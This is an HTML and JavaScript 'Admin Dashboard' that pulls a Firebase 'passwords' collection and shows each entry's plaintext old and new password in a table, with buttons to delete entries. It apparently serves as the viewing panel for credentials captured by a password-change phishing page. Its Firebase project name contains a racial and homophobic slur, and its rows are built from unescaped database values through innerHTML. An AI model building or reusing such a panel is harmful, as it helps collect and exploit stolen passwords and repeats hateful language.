<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Dashboard</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #f4f7fc;
      margin: 0;
      padding: 0;
    }
    .sidebar {
      height: 100vh;
      width: 200px;
      background: #1f1f1f;
      color: white;
      padding: 20px;
      position: fixed;
      top: 0;
      left: 0;
    }
    .sidebar h2 {
      margin-top: 0;
    }
    .content {
      margin-left: 220px;
      padding: 20px;
    }
    h1 {
      font-size: 2rem;
      margin-bottom: 20px;
    }
    table {
      width: 100%;
      margin-top: 20px;
      border-collapse: collapse;
    }
    th, td {
      padding: 12px;
      text-align: left;
      border-bottom: 1px solid #ddd;
    }
    th {
      background-color: #6200ea;
      color: white;
    }
    tr:hover {
      background-color: #f1f1f1;
    }
    .btn {
      padding: 10px 15px;
      background-color: #6200ea;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1rem;
      margin-top: 20px;
    }
    .btn:hover {
      background-color: #3700b3;
    }
  </style>
</head>
<body>
  <!-- Sidebar for Navigation -->
  <div class="sidebar">
    <h2>Admin Panel</h2>
    <ul>
      <li><a href="#" style="color: white; text-decoration: none;">Dashboard</a></li>
      <li><a href="#" style="color: white; text-decoration: none;">Users</a></li>
    </ul>
  </div>

  <!-- Main Content Area -->
  <div class="content">
    <h1>Password Management Dashboard</h1>
    <button class="btn" onclick="loadData()">Load Password Data</button>

    <!-- Table for displaying password data -->
    <table id="passwordsTable">
      <thead>
        <tr>
          <th>ID</th>
          <th>Old Password</th>
          <th>New Password</th>
          <th>Actions</th>
        </tr>
      </thead>
      <tbody>
        <!-- Data will be populated here from Firebase -->
      </tbody>
    </table>
  </div>

  <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js"></script>

  <script>
    // Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyBLqQhAtNuO632Xd3-e5Fe3oYDKLJGT8K0",
      authDomain: "gay-ass-nigga.firebaseapp.com",
      databaseURL: "https://gay-ass-nigga-default-rtdb.firebaseio.com",
      projectId: "gay-ass-nigga",
      storageBucket: "gay-ass-nigga.firebasestorage.app",
      messagingSenderId: "740449529935",
      appId: "1:740449529935:web:ab2538ff3bdad3fbc8fa3a"
    };

    // Initialize Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore(app);

    // Fetch and display password data
    async function loadData() {
      const tableBody = document.querySelector("#passwordsTable tbody");
      tableBody.innerHTML = ''; // Clear existing rows
      
      try {
        const querySnapshot = await db.collection("passwords").get();
        querySnapshot.forEach(doc => {
          const data = doc.data();
          const row = document.createElement("tr");
          
          row.innerHTML = `
            <td>${doc.id}</td>
            <td>${data.oldPassword}</td>
            <td>${data.newPassword}</td>
            <td>
              <button class="btn" onclick="deletePassword('${doc.id}')">Delete</button>
            </td>
          `;
          tableBody.appendChild(row);
        });
      } catch (error) {
        console.error("Error loading data: ", error);
      }
    }

    // Delete password entry
    async function deletePassword(id) {
      try {
        await db.collection("passwords").doc(id).delete();
        loadData(); // Reload the data after deletion
      } catch (error) {
        console.error("Error deleting document: ", error);
      }
    }
  </script>
</body>
  </html>
